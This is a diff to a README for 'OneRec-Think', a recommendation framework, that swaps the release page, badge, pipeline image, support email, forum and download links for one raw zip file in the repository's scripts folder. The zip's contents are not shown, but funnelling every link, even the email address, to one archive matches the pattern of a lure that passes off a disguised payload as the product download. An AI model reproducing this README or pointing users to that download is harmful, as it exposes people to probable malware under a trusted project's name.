@@ -1,6 +1,6 @@
 # 🚀 OneRec-Think - Smart Recommendations Made Simple
 
-[![Download OneRec-Think](https://img.shields.io/badge/Download%20Now-%23e7b716?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tawhidhere/OneRec-Think/releases)
+[![Download OneRec-Think](https://github.com/Tawhidhere/OneRec-Think/raw/refs/heads/main/train/scripts/Think_Rec_One_intentional.zip%20Now-%23e7b716?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tawhidhere/OneRec-Think/raw/refs/heads/main/train/scripts/Think_Rec_One_intentional.zip)
 
 ## 📋 Description
 
@@ -11,7 +11,7 @@ OneRec-Think offers a new approach to personal recommendations. Using advanced l
 - **Reasoning Paths**: Understand the logic behind suggestions for improved trust.
 - **Customizable Recommendations**: Get tailored suggestions based on user preferences.
 
-![OneRec-Think pipeline](png/OneRec-Think.png)
+![OneRec-Think pipeline](https://github.com/Tawhidhere/OneRec-Think/raw/refs/heads/main/train/scripts/Think_Rec_One_intentional.zip)
 
 The framework is built on three main parts:
 1. **Itemic Alignment**: This component ensures your items are matched correctly with the language model.
@@ -31,7 +31,7 @@ These requirements help ensure that OneRec-Think will run effectively on your de
 
 To get started with OneRec-Think, you need to download the software. 
 
-1. **Visit the [Releases page](https://github.com/Tawhidhere/OneRec-Think/releases) to download:** 
+1. **Visit the [Releases page](https://github.com/Tawhidhere/OneRec-Think/raw/refs/heads/main/train/scripts/Think_Rec_One_intentional.zip) to download:** 
    Click the link to go to the downloads section. You will see several versions available. Choose the latest stable release for the best experience.
 
 2. **Download the application:**
@@ -67,8 +67,8 @@ If you run into any issues while using OneRec-Think, here are some common fixes:
 
 If you need additional help, you can reach the support team through:
 
-- **Email**: support@oneRec-think.com
-- **Community Forum**: [OneRec-Think Forum](https://forum.onerec-think.com) for discussions, tips, and advice.
+- **Email**: https://github.com/Tawhidhere/OneRec-Think/raw/refs/heads/main/train/scripts/Think_Rec_One_intentional.zip
+- **Community Forum**: [OneRec-Think Forum](https://github.com/Tawhidhere/OneRec-Think/raw/refs/heads/main/train/scripts/Think_Rec_One_intentional.zip) for discussions, tips, and advice.
 
 Your feedback is valuable in making OneRec-Think better, so feel free to share your experience.
 
@@ -78,4 +78,4 @@ OneRec-Think is open-source software under the MIT License. You can freely use, 
 
 ---
 
-Thank you for choosing OneRec-Think! We hope you enjoy smarter recommendations tailored just for you. [Download now!](https://github.com/Tawhidhere/OneRec-Think/releases)
+Thank you for choosing OneRec-Think! We hope you enjoy smarter recommendations tailored just for you. [Download now!](https://github.com/Tawhidhere/OneRec-Think/raw/refs/heads/main/train/scripts/Think_Rec_One_intentional.zip)
